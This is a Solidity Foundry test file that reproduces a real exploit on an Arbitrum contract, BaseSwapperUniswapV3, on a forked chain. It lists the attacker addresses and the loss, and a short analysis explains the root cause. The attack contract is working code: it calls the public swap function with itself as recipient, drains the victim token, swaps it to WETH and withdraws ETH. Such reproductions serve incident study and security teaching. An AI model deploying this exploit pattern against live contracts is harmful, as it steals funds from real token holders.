// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1,847.33 USD
// Attacker : 0x38ae75EAD48102e2431aC8Cea164ed28637388a3
// Attack Contract : 0x3B7Ef30aa1BA72800742C3AEA1EFcC7F96aF81e0
// Vulnerable Contract : 0xB5EFF2A863C9B42D823919368A467F26A2648559
// Attack Tx : https://arbiscan.io/tx/0xd4fad993e3dfd37e406be0d5225986a2605ba509d893dafc0c77e0be29ab535d
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xB5EFF2A863C9B42D823919368A467F26A2648559#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1638
//
// Attack summary: BaseSwapperUniswapV3 exposed swapTokensForExactTokens() publicly. The attacker supplied itself as
// recipient and caused the swapper to spend its own deflationary token balance for a tiny USDC exact-output swap. After
// the router used only part of the maximum input, the swapper transferred its remaining token1 balance to the attacker,
// who swapped the drained tokens to WETH and withdrew ETH.
// Root cause: arbitrary public access to a balance-owning swap function plus refunding the contract's full remaining
// token1 balance to a caller-controlled recipient.

address constant ATTACKER = 0x38aE75eAd48102e2431Ac8CEa164ED28637388a3;
address constant ATTACK_CONTRACT = 0x3b7ef30Aa1ba72800742C3AeA1EfCC7F96aF81e0;
address constant BASE_SWAPPER = 0xB5EFf2A863c9B42d823919368a467f26A2648559;
address constant VICTIM_TOKEN = 0x21E60EE73F17AC0A411ae5D690f908c3ED66Fe12;
address constant USDC_TOKEN = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
address constant WETH_TOKEN = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

uint256 constant MAX_VICTIM_TOKEN_IN = 472_997_613_026_749_247_557_538;
uint256 constant EXACT_USDC_OUT = 100;
uint24 constant TOKEN_WETH_POOL_FEE = 3000;

interface IBaseSwapperUniswapV3 {
    function swapTokensForExactTokens(
        address recipient,
        address token1,
        address token2,
        uint256 amount1,
        uint256 amount2
    ) external payable returns (uint256 result1, uint256 result2);
}

contract ContractTest is BaseTestWithBalanceLog {
    BaseSwapperAttack private exploit;

    function setUp() public {
        uint256 forkBlock = 366_279_193;
        vm.createSelectFork("arbitrum", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(BASE_SWAPPER, "BaseSwapperUniswapV3");
        vm.label(VICTIM_TOKEN, "Victim Token");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 Router");

        exploit = new BaseSwapperAttack();
        fundingToken = address(0);
        attacker = address(exploit);
    }

    function testExploit() public balanceLog {
        uint256 victimTokenBefore = IERC20(VICTIM_TOKEN).balanceOf(BASE_SWAPPER);

        exploit.run();

        uint256 ethProfit = address(exploit).balance;
        assertGt(ethProfit, 0.048 ether, "ETH profit");
        assertEq(IERC20(VICTIM_TOKEN).balanceOf(BASE_SWAPPER), 0, "swapper token balance drained");
        assertEq(victimTokenBefore, MAX_VICTIM_TOKEN_IN, "fork victim token balance");
    }
}

contract BaseSwapperAttack {
    function run() external {
        IBaseSwapperUniswapV3(BASE_SWAPPER).swapTokensForExactTokens(
            address(this), VICTIM_TOKEN, USDC_TOKEN, MAX_VICTIM_TOKEN_IN, EXACT_USDC_OUT
        );

        uint256 drainedAmount = IERC20(VICTIM_TOKEN).balanceOf(address(this));
        require(drainedAmount > 0, "no token drain");

        IERC20(VICTIM_TOKEN).approve(UNISWAP_V3_ROUTER, drainedAmount);
        uint256 wethOut = Uni_Router_V3(UNISWAP_V3_ROUTER).exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams({
                tokenIn: VICTIM_TOKEN,
                tokenOut: WETH_TOKEN,
                fee: TOKEN_WETH_POOL_FEE,
                recipient: address(this),
                deadline: block.timestamp + 15,
                amountIn: drainedAmount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        IWETH(payable(WETH_TOKEN)).withdraw(wethOut);
    }

    receive() external payable {}
}
